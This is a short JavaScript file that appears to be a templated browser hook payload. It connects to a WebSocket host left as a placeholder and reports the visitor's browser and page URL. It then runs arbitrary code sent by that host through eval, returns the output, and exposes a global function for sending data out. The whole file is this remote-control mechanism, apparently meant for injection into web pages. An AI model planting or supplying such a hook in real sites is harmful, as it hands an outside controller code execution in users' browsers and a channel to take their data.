const socket = new WebSocket('%websocket%')

socket.onopen = () => {
  socket.send(JSON.stringify({ type: 'info', data: { browser: navigator.userAgent, url: location.href } }))
}

socket.onmessage = msg => {
  msg = JSON.parse(msg.data)
  if (msg.type === 'run') {
    const out = eval(msg.data)
    if (msg.noout) return
    socket.send(JSON.stringify({ type: 'output', data: out }))
  }
}

window.oobsend = data => socket.send(JSON.stringify({ type: 'output', data }))

window.socket = socket